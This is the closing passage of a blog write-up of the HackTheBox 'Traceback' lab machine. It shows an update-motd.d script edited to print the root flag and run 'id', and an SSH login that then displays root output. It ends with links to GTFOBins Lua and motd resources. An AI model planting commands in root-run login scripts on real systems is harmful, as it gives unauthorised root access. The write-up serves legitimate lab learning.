<span class="c">#    You should have received a copy of the GNU General Public License along</span>
<span class="c">#    with this program; if not, write to the Free Software Foundation, Inc.,</span>
<span class="c">#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span>

<span class="o">[</span> <span class="nt">-r</span> /etc/lsb-release <span class="o">]</span> <span class="o">&amp;&amp;</span> <span class="nb">.</span> /etc/lsb-release


<span class="nb">echo</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">Welcome to Xh4H land </span><span class="se">\n</span><span class="s2">"</span>
<span class="nb">cat</span> /root/root.txt
<span class="nb">id</span> <span class="o">&amp;&amp;</span> <span class="nb">whoami
</span>sysadmin@traceback:/etc/update-motd.d<span class="nv">$ </span>
</pre></table></code></div></div><p>And on login again via SSH i got the root flag</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="o">[</span>vibhu@parrot]─[~/.ssh]<span class="nv">$ </span>ssh <span class="nt">-i</span> id_rsa webadmin@10.10.10.181
<span class="c">#################################</span>
<span class="nt">--------</span> OWNED BY XH4H  <span class="nt">---------</span>
- I guess stuff could have been configured better ^^ -
<span class="c">#################################</span>

Welcome to Xh4H land 

9fdc59db[Redacted]58d49e5a
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
root

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Tue Jul  7 10:34:22 2020 from 10.10.14.166
webadmin@traceback:~<span class="nv">$ </span>
</pre></table></code></div></div><h1 id="resources">Resources:~$</h1><table><thead><tr><th>Topic<th>Link<tbody><tr><td>GTFObins Lua<td><a href="https://gtfobins.github.io/gtfobins/lua/">Here</a><tr><td>Update-mode.d<td><a href="https://linuxconfig.org/how-to-change-welcome-message-motd-on-ubuntu-18-04-server">Here</a></table><p>With this, we come to the end of the story of how I owned Traceback 😃</p><p>Thank you for reading !!!</p><p><em>I would love to hear about any suggestions or queries.</em></p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>Hackthebox</a>, <a href='/categories/active/'>Active</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/hackthebox/" class="post-tag no-text-decoration" >Hackthebox</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >Linux</a> <a href="/tags/lua/" class="post-tag no-text-decoration" >lua</a> <a href="/tags/gtfobins/" class="post-tag no-text-decoration" >GTFObins</a> <a href="/tags/update-mote.d/" class="post-tag no-text-decoration" >update-mote.d</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox Traceback Writeup - Vibhu025&url=https://Vibhu025.github.io/posts/htb-traceback/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox Traceback Writeup - Vibhu025&u=https://Vibhu025.github.io/posts/htb-traceback/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hackthebox Traceback Writeup - Vibhu025&url=https://Vibhu025.github.io/posts/htb-traceback/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/htb-traceback/">Hackthebox Traceback Writeup</a></li><li><a href="/posts/htb-servmon/">Hackthebox Servmon Writeup</a></li><li><a href="/posts/htb-quick/">Hackthebox Quick Writeup</a></li><li><a href="/posts/htb-registry/">Hackthebox Registry Writeup</a></li></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <!-- The trending tags list v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung MIT Licensed --> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/hackthebox/">Hackthebox</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/update-mote.d/">update mote.d</a> <a class="post-tag" href="/tags/port-forwarding/">port forwarding</a> <a class="post-tag" href="/tags/nvms-1000/">nvms 1000</a> <a class="post-tag" href="/tags/nsclient%2B%2B/">nsclient++</a> <a class="post-tag" href="/tags/lua/">lua</a> <a class="post-tag" href="/tags/xslt-injection/">XSLT Injection</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-3">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="post-extend-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <span class="btn btn-outline-primary disabled"><p>-</p></span> <a href="/posts/htb-registry/" class="btn btn-outline-primary"><p>Hackthebox Registry Writeup</p></a></div><!-- The Disqus lazy loading. Powered by: https://osvaldas.info/lazy-loading-disqus-comments v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung MIT License --><div id="disqus" class="pt-2 pb-4"><p class="font-italic text-muted small">Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '//vibhu025.disqus.com/embed.js', disqusConfig: function() { this.page.url = 'https://Vibhu025.github.io/posts/htb-traceback/'; this.page.identifier = '/posts/htb-traceback/'; } }; $.disqusLoader('#disqus', options); </script> <!-- The related posts of current post. Placed in the bottom of every single post. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-4 mb-2 mb-sm-4 pb-2"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-magic/"><div class="card-body"> <span class="timeago small"> May 8, 2020 <i class="unloaded">2020-05-08T20:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Magic Writeup</h3><div class="text-muted small"><p>Information:~$ Title Details Name Magic IP 10.10.10.185 Difficulty Medium Points ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-book/"><div class="card-body"> <span class="timeago small"> May 9, 2020 <i class="unloaded">2020-05-09T20:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Book Writeup</h3><div class="text-muted small"><p>Information:~$ Title Details Name Book IP 10.10.10.176 Difficulty Medium Points 3...</p></div></div></a></div><div class="card"> <a href="/posts/htb-admirer/"><div class="card-body"> <span class="timeago small"> May 10, 2020 <i class="unloaded">2020-05-10T18:00:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Admirer Writeup</h3><div class="text-muted small"><p>Information:~$ Title Details Name Admirer IP 10.10.10.187 Difficulty Easy Points ...</p></div></div></a></div></div></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const el = document.querySelectorAll('#post-wrapper img'); const observer = lozad(el); observer.observe(); </script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"> <script src="https://www.hackthebox.eu/badge/270629"></script></div><div class="footer-right"><p class="mb-0"> © 2020 <a href="https://twitter.com/vibhu_bansal_">Vibhu Bansal</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">All rights reserved.</span></p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted">Trending Tags</h4><!-- The trending tags list v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung MIT Licensed --> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/hackthebox/">Hackthebox</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/update-mote.d/">update mote.d</a> <a class="post-tag" href="/tags/port-forwarding/">port forwarding</a> <a class="post-tag" href="/tags/nvms-1000/">nvms 1000</a> <a class="post-tag" href="/tags/nsclient%2B%2B/">nsclient++</a> <a class="post-tag" href="/tags/lua/">lua</a> <a class="post-tag" href="/tags/xslt-injection/">XSLT Injection</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js" integrity="sha256-qcLR00zq6pJk4je3MLgAri8Nn+ZumUlXgTKR2H/xCY0=" crossorigin="anonymous"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://Vibhu025.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
